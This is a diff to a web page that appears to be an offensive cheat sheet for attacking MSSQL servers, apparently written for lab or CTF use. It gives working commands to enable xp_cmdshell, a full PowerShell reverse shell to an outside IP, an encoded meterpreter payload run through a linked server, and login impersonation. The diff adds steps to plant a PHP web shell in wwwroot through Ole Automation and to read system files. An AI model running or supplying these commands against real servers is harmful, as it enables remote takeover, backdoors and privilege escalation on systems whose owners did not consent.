@@ -72,19 +72,14 @@
 
                 <p>Show linked servers</p>
                 <pre><code class="language-sql">EXEC sp_linkedservers;</code></pre>
+                <pre><code class="language-sql">SELECT srvname, isremote FROM sysservers #1 means remote</code></pre>
 
                 <p>Execute commands in linked server (Check which user you are)</p>
                 <pre><code class="language-sql">EXEC ('SELECT SYSTEM_USER, USER_NAME()') AT [DC02.darkzero.ext];</code></pre>
-
-                <p>Check if users have impersonate permission</p>
-                <pre><code class="language-sql">SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';</code></pre>
-                <p>In case you can...</p>
-                <pre><code class="language-sql">EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER;</code></pre>
+                <pre><code class="language-sql">EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS];</code></pre>
             </ul>
 
 
-
-            
             <h2>Enumeration</h2>
             <ul>
                 <p>Files that may contain credentials</p>
@@ -114,9 +109,11 @@ RECONFIGURE;
 
 EXEC sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;</code></pre>
-                <b>You can alternativelly use the metasploit module "exploit/windows/mssql/mssql_payload" and gather a meterpreter sher</b>    
+                <b>You can alternativelly use the metasploit module "exploit/windows/mssql/mssql_payload" and gather a meterpreter shell</b>    
+
 
                 <h4> Reverse Socket connection </h4>
+                <ul>
                 <pre><code class="language-sql">EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.18'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> ''; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}"';</code></pre>
                 <p>It is highly recomended to capture it using metasploit. Check this out</p>
                 <p>Generate meterpreter payload and encode it</p>
@@ -126,13 +123,43 @@ RECONFIGURE;</code></pre>
                 <p>Perform connection from mssql srv. Have in mind that there is a link statement at the end. It is not necessary always</p>
                 <pre><code class="language-sql">EXEC ('EXEC xp_cmdshell ''powershell -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgB...''') AT [DC02.darkzero.ext]</code></pre>    
                 <p>Capture the connection using plugin exploit/multi/handler</p>
+                </ul>
             </ul>
+
+            <h3>File write</h3> 
+             <ul>  
+                <p>To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:</p>
+                <pre><code class="language-sql">EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+
+EXEC sp_configure 'Ole Automation Procedures', 1
+RECONFIGURE;</code></pre>
+                <p>Now you can start creating a file</p>
+                <pre><code class="language-sql">DECLARE @OLE INT
+DECLARE @FileID INT
+EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '&lt;?php echo shell_exec($_GET["c"]);?&gt;'
+EXECUTE sp_OADestroy @FileID
+EXECUTE sp_OADestroy @OLE</code></pre>
+            <b>Just a quote. 8 means open the file to append and 1 creates the file if not exists</b>        
+            </ul>
+
+            <h3>File read</h3> 
+             <ul>  
+                <p>In case you have enough permissions to read files we can perform the following methods:</p>
+                <pre><code class="language-sql">SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents</code></pre>
+            </ul>
+
+            
+            
 
             <h3>User Impersonation</h3> 
              <ul>  
                 <h4>Using the following query you are able to check if you can IMPERSONATE any user</h4>
                 <pre><code class="language-sql">SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'</code></pre>
                 <p>In case you found a user. Execute the following to impersonate</p>
+                <p>Remember that in case you are impersonating a username which does not have access to the database you are using this will fail. It is recomended to use master database since all users have access there</p>
                 <pre><code class="language-sql">EXECUTE AS LOGIN = '$USERNAME'</code></pre>
                 <p>Check that you are impersonating the right user
                 <pre><code class="language-sql">SELECT SYSTEM_USER</code></pre>
